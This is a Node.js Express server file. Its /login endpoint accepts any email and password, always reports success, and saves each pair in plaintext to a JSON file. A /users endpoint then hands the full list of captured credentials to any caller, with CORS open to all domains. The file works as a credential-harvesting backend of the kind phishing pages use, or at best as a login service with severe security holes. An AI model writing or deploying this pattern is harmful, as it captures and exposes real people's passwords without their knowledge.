const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
const port = 3000;

// Enable CORS for all domains (you can customize this later)
app.use(cors());

// Middleware to parse JSON request bodies
app.use(express.json());

// Endpoint to handle login requests
app.post("/login", (req, res) => {
  const { email, password } = req.body;
  
  // Log the login attempt with email and password
  logLoginAttempt(email, password);

  return res.status(200).json({ message: "Login successful" });
});

// Endpoint to fetch all login attempts (users)
app.get("/users", (req, res) => {
  const filePath = path.join(__dirname, "loginAttempts.json");

  // Read the loginAttempts.json file
  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      console.error("Error reading the file:", err);
      return res.status(500).json({ message: "Failed to fetch users" });
    }

    // Parse and return the data as a JSON response
    let loginAttempts = [];
    try {
      loginAttempts = JSON.parse(data);
    } catch (parseError) {
      console.error("Error parsing JSON:", parseError);
    }

    res.json(loginAttempts);
  });
});

// Function to log login attempts to a JSON file
function logLoginAttempt(email, password) {
  const loginAttempt = {
    email,
    password,
    timestamp: new Date().toISOString(),
  };

  const filePath = path.join(__dirname, "loginAttempts.json");

  // Check if the file exists and is not empty
  if (fs.existsSync(filePath) && fs.statSync(filePath).size > 0) {
    // Read existing data from the file (if any)
    fs.readFile(filePath, "utf8", (err, data) => {
      if (err) {
        console.error("Error reading the file:", err);
        return;
      }

      let loginAttempts = [];
      try {
        loginAttempts = JSON.parse(data);  // Parse existing data
      } catch (parseError) {
        console.error("Error parsing JSON:", parseError);
        loginAttempts = []; // Reset to empty array if parsing fails
      }

      // Add the new login attempt to the array
      loginAttempts.push(loginAttempt);

      // Write the updated login attempts back to the JSON file
      fs.writeFile(filePath, JSON.stringify(loginAttempts, null, 2), "utf8", (err) => {
        if (err) {
          console.error("Error saving login attempts:", err);
        } else {
          console.log("Login attempt logged.");
        }
      });
    });
  } else {
    // If the file doesn't exist or is empty, create an empty array and save the new login attempt
    const loginAttempts = [loginAttempt];
    fs.writeFile(filePath, JSON.stringify(loginAttempts, null, 2), "utf8", (err) => {
      if (err) {
        console.error("Error creating the file:", err);
      } else {
        console.log("Login attempt logged (new file created).");
      }
    });
  }
}

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
